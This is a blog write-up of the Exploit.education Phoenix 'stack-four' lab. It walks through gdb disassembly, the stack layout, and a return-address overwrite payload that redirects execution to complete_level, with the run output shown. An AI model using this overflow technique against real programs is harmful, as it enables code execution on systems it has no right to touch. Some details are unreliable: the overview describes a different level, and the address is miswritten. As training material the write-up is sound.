If you're learning and writing binary exploits, I would strongly recommend you to take [Architecture 1001: x86-64 Assembly](https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/course/) course by `Xeno Kovah`. They cover a wide variety of learning assembly instructions which will be really helpful to understand the exploits.

If you haven't done setting-up your lab, feel free to check out my previous article on [Exploit.education lab setup](https://shivasurya.me/security/binary-exploit/reverse-engineering/friday-gems/2023/01/06/exploit-education-lab-setup.html)

### Quick Overview

Similar to Stack Two, Stack Four exercise motive is to smash the stack to modify other variables in the stack to a `hex value` and technically overwrite `function pointer` in the stack. Similar to `gets` in Stack Zero, `strcpy` function is unsafe that doesn't have bounds check, it accepts memory address to write but doesn't care about overwriting other declared function pointer in stack. If you take closer look at the struct which isn't dynamically being allocated by `malloc` function, so probably the struct which contains both `char buffer[64]` and `volatile int *fp` function pointer stays in main stackframe. This overwritten function pointer will be further used to invoke in later part of the program.

### Disassemble

Disassembling the code will get you overall idea behind the stack-four code, One can use `gdb ./stack-four` to start debugging it in runtime.

1. `gdb ./stack-four`
2. Type `disassemble main` to get the disassembled code (assembly)

```assembly
   0x000000000040066a <+0>:     push   rbp
   0x000000000040066b <+1>:     mov    rbp,rsp
   0x000000000040066e <+4>:     sub    rsp,0x10
   0x0000000000400672 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400675 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400679 <+15>:    mov    edi,0x400750
   0x000000000040067e <+20>:    call   0x400480 <puts@plt>
   0x0000000000400683 <+25>:    mov    eax,0x0
   0x0000000000400688 <+30>:    call   0x400635 <start_level>
   0x000000000040068d <+35>:    mov    eax,0x0
   0x0000000000400692 <+40>:    leave
   0x0000000000400693 <+41>:    ret
```

`> disassemble start_level`

```assembly
   0x0000000000400635 <+0>:     push   rbp
   0x0000000000400636 <+1>:     mov    rbp,rsp
   0x0000000000400639 <+4>:     sub    rsp,0x50
   0x000000000040063d <+8>:     lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:    mov    rdi,rax
   0x0000000000400644 <+15>:    call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:    mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:    mov    rsi,rax
   0x0000000000400658 <+35>:    mov    edi,0x400733
   0x000000000040065d <+40>:    mov    eax,0x0
   0x0000000000400662 <+45>:    call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:    nop
   0x0000000000400668 <+51>:    leave
   0x0000000000400669 <+52>:    ret
```

If you carefully check the source, you might miss `complete_level` in the above disassembled code. You can go ahead and type `disassemble complete_level` in the gdb prompt,

```assembly
   0x000000000040061d <+0>:     push   rbp
   0x000000000040061e <+1>:     mov    rbp,rsp
   0x0000000000400621 <+4>:     mov    edi,0x4006f0
   0x0000000000400626 <+9>:     call   0x400480 <puts@plt>
   0x000000000040062b <+14>:    mov    edi,0x0
   0x0000000000400630 <+19>:    call   0x400490 <exit@plt>
```

Before taking a look at the code, if you disassembled the stack-four using gdb to view the assembly instruction, you may notice the puts, start_level, exit and gets function calls with parameters. So basically when you hit `r` in gdb without breakpoint,

1. Greet with `Welcome to phoenix/stack-four, brought to you by https://exploit.education` message via Puts (aka printf) method
3. Invokes `start_level` function `0x400635`
4. Accepts user input via `gets` method with `buffer` memory address.
5. Invoke `__builtin_return_address` method to get the `rip` register address which is already stored in stack
6. Print the return address via `puts` method.

### Primary Goal

The primary goal of this exercise is to make you familiar to overwrite return address in the stack with your own return address to a function and therefore redirecting the program flow to achieve code execution. In the ideal exploit world, you may overwrite the return address and redirect to `system` function to achieve remote code execution. In this exercise, you might want to overwrite the return address stored in the `start_level` stackframe and redirect the program flow to `complete_level`. The return address is used by `$rip` register aka instruction pointer which is responsible for loading next instruction of the program.

### Memory Allocation

As you see that the `buffer` variable isn't dynamically allocated, they are allocated in the stack frame same as `main` function gets executes. The main function starts executing my pushing `$rbp` to stack at `0x7fffffffe660` and then `rsp` to `$rbp-0x10` (`0x7fffffffe650`) as expected the stack grows from top (higher memory address) to bottom (lower memory address). After series of steps, `start_level` is invoked pushing $rbp again to `0x7fffffffe640` and $rsp to `0x7fffffffe5f0`.

![Stack Memory Layout from $rbp till $rsp](/assets/media/exploit-education-phoenix-stack-four-rbp.jpg)

You can see that `buffer` (64 bytes) gets written at `$rbp-0x50` i.e `0x7fffffffe5f0` and `$rip` register (4 bytes) at `rbp-0x10` i.e `0x7fffffffe650`. Now that you got the overall idea of the memory layout of the stack, you can now go ahead blow up the stack to overwrite `$rip` aka return address stored in stack. If you play around with these memory layout behaviour, you can note that the char `buffer` variable writes from `$rbp-0x50` towards `$rbp-0x08` i.e `0x7fffffffe648`.

### Exploit

As previously discussed `buffer` and `$rip` are allocated nearby each other in stack. So, if your input of 64 characters (example: 64 * 'A') wouldn't overrite the $rip register (instruction pointer), but if you do the same with 88 characters + 4 character (actual $rip), you have succesfully overwritten `$rip` register. However, our challenge is to overwrite return address ($rip) with `complete_level` function memory address. So, How do I get the `complete_level` function loaded memory address? Simple, use gdb disassemble `disassemble complete_level` command and note down the starting `$rbp` address aka `0x4001d` (ignore the padding zeros).

If you try generating the payload simply  `(A * 88) + '\x40\x06\x1d'`, this would represent in the memory as `88 'A's & 0x40069d` 😵. Remember [Little Endianness](https://en.wikipedia.org/wiki/Endianness) ?, Yes Intel or AT&T syntax follows Little Endianness, so the representation should be in reverse order as `'A'*88 + '\x1d\x06\x40'`.

### Result

`> r <<< $(python -c "print('A'*88 + '\x1d\x06\x40')")` in gdb prompt.

```assembly
(gdb) r <<< $(python -c "print('A'*88 + '\x1d\x06\x40')")
Starting program: /opt/phoenix/amd64/stack-four <<< $(python -c "print('A'*88 + '\x1d\x06\x40')")
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
[Inferior 1 (process 317) exited normally]
```

There you go! 🎉 You've officially `pwned` the `binary` and possibly you could control the program flow and may 
eventually perform remote code execution in the system. 🪲
